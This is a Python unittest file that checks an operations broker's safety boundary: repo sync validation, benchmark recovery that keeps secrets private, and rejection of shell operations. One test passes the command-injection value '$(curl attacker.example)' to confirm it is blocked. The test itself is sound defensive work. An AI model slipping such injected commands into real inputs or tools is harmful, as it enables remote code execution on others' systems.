"""Offline, no-network checks for the VPS G5 MCP capability boundary."""
from __future__ import annotations

import os
from pathlib import Path
import sys
import tempfile
import types
import unittest
from unittest import mock

sys.path.insert(0, str(Path(__file__).resolve().parent))
import benchmark_ops as ops
import operations_broker as broker


class Repos(unittest.TestCase):
    def test_sync_rejects_non_sha(self):
        with mock.patch.object(ops, '_git') as git:
            self.assertEqual(ops.repo_sync('$(curl attacker.example)').get('status'), 'blocked')
            git.assert_not_called()

    def test_sync_rejects_wrong_branch(self):
        with tempfile.TemporaryDirectory() as temp:
            with mock.patch.object(ops, 'REPO', Path(temp)), \
                 mock.patch.object(ops, '_lock', return_value=os.open(os.devnull, os.O_RDONLY)), \
                 mock.patch.object(ops, '_git', return_value='feature'):
                self.assertEqual(ops.repo_sync('a'*40).get('status'), 'blocked')

    def test_sync_refuses_untrusted_origin(self):
        class Repo:
            def is_symlink(self): return False
            def is_dir(self): return True
            def stat(self): return types.SimpleNamespace(st_uid=0)
            def __str__(self): return '/docker/agente-sql-langgraph-repo'
        def query(*args, **kw):
            key=args[0]
            return {'rev-parse':'/docker/agente-sql-langgraph-repo',
                    'branch':'main','status':'','remote':'https://bad.example/repo'}[key]
        with mock.patch.object(ops, 'REPO', Repo()), \
             mock.patch.object(ops, '_lock', return_value=os.open(os.devnull, os.O_RDONLY)), \
             mock.patch.object(ops, '_git', side_effect=query):
            r=ops.repo_sync('a'*40)
        self.assertEqual(r,{'status':'blocked','reason':'repo_origin_untrusted'})

    def test_sync_blocks_diverged_main(self):
        class Repo:
            def is_symlink(self): return False
            def is_dir(self): return True
            def stat(self): return types.SimpleNamespace(st_uid=0)
            def __str__(self): return '/docker/agente-sql-langgraph-repo'
        def query(*args, **kw):
            k=args[0]
            if k == 'rev-parse': return '/docker/agente-sql-langgraph-repo' if args[1] == '--show-toplevel' else 'a'*40 if args[1] == 'HEAD' else 'b'*40
            if k == 'branch': return 'main'
            if k == 'status': return ''
            if k == 'remote': return 'https://github.com/leandrosilveiradepaula/agente-sql-langgraph.git'
            if k == 'merge-base': raise ops.Refused('command_failed')
            return ''
        with mock.patch.object(ops, 'REPO', Repo()), \
             mock.patch.object(ops, '_lock', return_value=os.open(os.devnull, os.O_RDONLY)), \
             mock.patch.object(ops, '_git', side_effect=query) as git:
            r=ops.repo_sync('b'*40)
        self.assertEqual(r['status'],'blocked')
        self.assertFalse(any(call.args[0] == 'merge' for call in git.mock_calls))

    def test_reviewed_code_is_pinned(self):
        with mock.patch.object(ops, '_head', return_value='a'*40):
            with self.assertRaises(ops.Refused): ops._reviewed_source()


class Recovery(unittest.TestCase):
    def test_plan_does_not_decrypt(self):
        with mock.patch.object(ops, '_reviewed_source'), mock.patch.object(ops, '_source_ref',return_value='examplearchiverefval'), mock.patch.object(ops, '_run_plan_command', return_value='BENCHMARK_ARCHIVE_DIGEST=PASS\nBENCHMARK_IMAGE_PINNED=PASS\nBENCHMARK_PLAN=PASS\nBENCHMARK_SOURCE_DATA_READ=false') as run:
            self.assertEqual(ops.benchmark_plan()['status'],'pass')
            argv=run.call_args.args[0]
            self.assertIn('--plan',argv)
            self.assertNotIn('--recover',argv)

    def test_plan_safe_reason(self):
        fake = types.SimpleNamespace(returncode=2,
            stdout='BENCHMARK_BLOCK_REASON=POSTGRES17_IMAGE_NOT_CACHED\n', stderr='secret')
        with mock.patch.object(ops.subprocess, 'run', return_value=fake):
            with self.assertRaises(ops.Refused) as result:
                ops._run_plan_command(['plan'])
        self.assertEqual(str(result.exception), 'plan_postgres17_image_not_cached')

    def test_plan_untrusted_reason_is_hidden(self):
        fake = types.SimpleNamespace(returncode=2,
            stdout='BENCHMARK_BLOCK_REASON=SECRET_VALUE\n', stderr='secret')
        with mock.patch.object(ops.subprocess, 'run', return_value=fake):
            with self.assertRaises(ops.Refused) as result:
                ops._run_plan_command(['plan'])
        self.assertEqual(str(result.exception), 'plan_failed_unclassified')
    def test_secret_rejected_and_deleted_if_not_root_owned(self):
        with tempfile.TemporaryDirectory() as temp:
            path=Path(temp)/'one-shot'
            path.write_text('no-real-secret-0123456789',encoding='ascii')
            path.chmod(0o644)
            with mock.patch.object(ops, 'SECRET',path):
                with self.assertRaises(ops.Refused): ops._one_shot_secret()
            self.assertFalse(path.exists())

    @unittest.skipUnless(os.name=='posix', 'PTY on POSIX only')
    def test_tty_recover_never_returns_password(self):
        with tempfile.TemporaryDirectory() as temp:
            path=Path(temp)
            pkg=path/'scripts'/'operations'
            pkg.mkdir(parents=True)
            (path/'scripts'/'__init__.py').write_text('')
            (pkg/'__init__.py').write_text('')
            (pkg/'g5_recover_legacy_benchmark_offline.py').write_text('''
import getpass
confirm=input('Digite RECOVER-LEGACY-BENCHMARK-63: ')
secret=getpass.getpass('Senha do arquivo G5 (sem eco): ')
assert confirm=='RECOVER-LEGACY-BENCHMARK-63'
assert secret=='example-one-use-password-9876'
print('BENCHMARK_RECOVERY=PASS')
print('BENCHMARK_CASES=63')
print('BENCHMARK_OFFICIAL_SQL_PRESENT=61')
print('BENCHMARK_ISOLATED_CONTAINER_CLEANUP=PASS')
print('BENCHMARK_OUTPUT_PRIVATE=PASS')
print('BENCHMARK_FINANCIAL_SQL_EXECUTED=false')
print('BENCHMARK_LLM_CALLS=0')
''')
            with mock.patch.object(ops,'REPO',path), mock.patch.object(ops,'PYTHON',Path(sys.executable)),mock.patch.object(ops,'RECOVERY_TIMEOUT',10), mock.patch.object(ops,'_source_ref',return_value='examplearchiverefval'):
                res=ops._tty_recover(b'example-one-use-password-9876')
            self.assertEqual(res['status'],'pass')
            self.assertEqual(res['historic_sql_present'],61)
            self.assertNotIn('password',str(res))

    def test_recovery_without_archive_never_reads_secret(self):
        with mock.patch.object(ops,'_plan', side_effect=ops.Refused('archive_missing')), \
             mock.patch.object(ops,'_one_shot_secret') as read, \
             mock.patch.object(ops,'_lock',return_value=os.open(os.devnull,os.O_RDONLY)):
            self.assertEqual(ops.benchmark_recover(),{'status':'blocked','reason':'archive_missing'})
            read.assert_not_called()

    def test_status_with_installer_created_empty_directory(self):
        # The CI runner is unprivileged; emulate only the private root's
        # root-owned metadata, keeping the actual directory operations real.
        root_metadata = types.SimpleNamespace(st_uid=0, st_mode=0o040700)
        with tempfile.TemporaryDirectory() as root, \
             mock.patch.object(ops, '_reviewed_source'), \
             mock.patch.object(ops, 'DEST', Path(root)), \
             mock.patch.object(Path, 'lstat', return_value=root_metadata):
            result = ops.benchmark_status()
        self.assertEqual(result, {'status': 'not_recovered'})

    def test_status_rejects_unexpected_private_root_content(self):
        root_metadata = types.SimpleNamespace(st_uid=0, st_mode=0o040700)
        with tempfile.TemporaryDirectory() as root:
            (Path(root)/'unexpected').write_text('do not delete')
            with mock.patch.object(ops, '_reviewed_source'), \
                 mock.patch.object(ops, 'DEST', Path(root)), \
                 mock.patch.object(Path, 'lstat', return_value=root_metadata):
                result = ops.benchmark_status()
        self.assertEqual(result, {
            'status': 'blocked', 'reason': 'recovery_snapshot_missing_or_ambiguous'
        })

    def test_status_without_results(self):
        with tempfile.TemporaryDirectory() as d, mock.patch.object(ops, '_reviewed_source'), mock.patch.object(ops,'DEST',Path(d)/'nothing'):
            self.assertEqual(ops.benchmark_status(),{'status':'not_recovered'})

    def test_broker_requires_exact_request_shape(self):
        # Invalid dynamic operation is rejected, never passed to a shell.
        self.assertEqual(broker.dispatch('execute_shell')['reason'],'operation_not_allowed')


if __name__=='__main__':
    unittest.main()